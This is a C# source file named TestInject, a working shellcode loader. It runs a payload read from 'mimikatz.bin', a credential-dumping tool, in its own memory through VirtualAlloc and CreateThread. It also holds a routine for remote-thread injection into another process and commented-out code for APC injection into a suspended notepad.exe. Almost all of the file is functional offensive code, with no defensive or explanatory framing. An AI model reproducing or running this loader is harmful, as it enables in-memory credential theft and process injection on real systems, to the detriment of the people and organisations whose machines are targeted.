using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TestInject
{
    class Program
    {
        public static void ExecSelf(byte[] shellcode)
        {


            var baseAddress = Native.Kernel32.VirtualAlloc(
                    IntPtr.Zero,
                    shellcode.Length,
                    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                    Native.Kernel32.MemoryProtection.ExecuteReadWrite);

            if (baseAddress == IntPtr.Zero)
            {
                Console.WriteLine($"Failed to allocate memory for Loader.dll, error code: {Marshal.GetLastWin32Error()}");
                return;
            }

            try
            {
                Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

                if (!Native.Kernel32.VirtualProtect(
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    throw new InvalidOperationException($"Failed to change memory to execute, error code: {Marshal.GetLastWin32Error()}");
                }

                uint threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                IntPtr hThread = Native.Kernel32.CreateThread(
                    0,
                  0,
                  baseAddress,
                  pinfo,
                  0,
                  ref threadId);

                if (hThread == IntPtr.Zero)
                {
                    throw new InvalidOperationException($"Failed to create  thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                }

                Native.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (InvalidOperationException e)
            {
                Console.WriteLine(e.Message);
            }
            finally
            {
                Native.Kernel32.VirtualFreeEx(Process.GetCurrentProcess().Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }

        }

        public static void Exec(Process target, byte[] shellcode)
        {

            var baseAddress = Native.Kernel32.VirtualAllocEx(
                target.Handle,
                IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            if (baseAddress == IntPtr.Zero)
            {
                Console.WriteLine($"Failed to allocate memory for Loader.dll, error code: {Marshal.GetLastWin32Error()}");
                return;
            }

            try
            {
                IntPtr bytesWritten = IntPtr.Zero;
                if (!Native.Kernel32.WriteProcessMemory(target.Handle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                {
                    Console.WriteLine($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");
                    return;
                }

                if (bytesWritten.ToInt32() != shellcode.Length)
                {
                    Console.WriteLine($"Failed to write All the shellcode into the process");
                    return;
                }

                if (!Native.Kernel32.VirtualProtectEx(
                    target.Handle,
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
                }

                IntPtr threadres = IntPtr.Zero;

                IntPtr thread = Native.Kernel32.CreateRemoteThread(target.Handle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

                if (thread == IntPtr.Zero)
                {
                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                }

                Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
            }
            catch (InvalidOperationException e)
            {
                Console.WriteLine(e.Message);
            }
            finally
            {
                Native.Kernel32.VirtualFreeEx(target.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }

        }

        static void Main(string[] args)
        {
            byte[] shellcode;
            using (var stream = File.OpenRead("e:\\Share\\tmp\\mimikatz.bin"))
            {
                shellcode = new byte[stream.Length];
                stream.Read(shellcode, 0, shellcode.Length);
            }


            //var proc = Process.GetProcessById(14240);

            //Exec(proc, shellcode);



            ExecSelf(shellcode);



            Console.WriteLine("press key!");
            Console.ReadKey();
            //IntPtr funcAddr;


            //funcAddr = NativeMethods.VirtualAlloc(
            //   IntPtr.Zero,
            //   (uint)shellcode.Length,
            //   (uint)NativeMethods.StateEnum.MEM_COMMIT,
            //   (uint)NativeMethods.Protection.PAGE_EXECUTE_READWRITE);



            ////Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);



            //IntPtr hThread = NativeMethods.CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, IntPtr.Zero);
            ////hThread = NativeMethods.CreateThread(IntPtr.Zero, 0, funcAddr, pinfo, 0, threadId);
            ////NativeMethods.WaitForSingleObject(hThread, 0xFFFFFFFF);
            //return;


            //try
            //{
            //    var baseAddress = Native.Kernel32.VirtualAlloc(
            //        IntPtr.Zero,
            //        shellcode.Length,
            //        Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
            //        Native.Kernel32.MemoryProtection.ExecuteReadWrite);

            //    Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            //    //Native.Kernel32.VirtualProtect(
            //    //    baseAddress,
            //    //    shellcode.Length,
            //    //    Native.Kernel32.MemoryProtection.ExecuteRead,
            //    //    out _);




            //    Console.WriteLine(Marshal.GetLastWin32Error());

            //    IntPtr hThread = IntPtr.Zero;
            //    uint threadId = 0;
            //    IntPtr pinfo = IntPtr.Zero;
            //    hThread = Native.Kernel32.CreateThread(
            //      0,
            //      0,
            //      baseAddress,
            //      pinfo,
            //      0,
            //      ref threadId);

            //    Native.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
            //    Console.WriteLine(Marshal.GetLastWin32Error());
            //}
            //catch(Exception ex)
            //{
            //    int i = 0;
            //}
            //Console.WriteLine(threadId);

            //Native.Kernel32.QueueUserAPC(baseAddress, pi.hThread, 0);

            //var pa = new Native.Kernel32.SECURITY_ATTRIBUTES();
            //pa.nLength = Marshal.SizeOf(pa);

            //var ta = new Native.Kernel32.SECURITY_ATTRIBUTES();
            //pa.nLength = Marshal.SizeOf(ta);

            //var si = new Native.Kernel32.STARTUPINFO();

            //if (!Native.Kernel32.CreateProcess(@"c:\windows\system32\notepad.exe", null,
            //    ref pa, ref ta,
            //    false, Native.Kernel32.CreationFlags.CreateSuspended,
            //    IntPtr.Zero, @"c:\windows\system32", ref si, out var pi))
            //{
            //    Console.WriteLine("Error spawning noteapd!");
            //    return;
            //}

            //var baseAddress = Native.Kernel32.VirtualAllocEx(
            //    pi.hProcess,
            //    IntPtr.Zero,
            //    shellcode.Length,
            //    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
            //    Native.Kernel32.MemoryProtection.ReadWrite);

            //Native.Kernel32.WriteProcessMemory(
            //    pi.hProcess,
            //    baseAddress,
            //    shellcode,
            //    shellcode.Length,
            //    out _);

            //Native.Kernel32.VirtualProtectEx(
            //    pi.hProcess,
            //    baseAddress,
            //    shellcode.Length,
            //    Native.Kernel32.MemoryProtection.ExecuteRead,
            //    out _);

            //Native.Kernel32.QueueUserAPC(baseAddress, pi.hThread, 0);

            //var result = Native.Kernel32.ResumeThread(pi.hThread);

            //if (result <= 0)
            //    Console.WriteLine("Error starting Thread;");

            Thread.Sleep(10000);

        }
    }
}
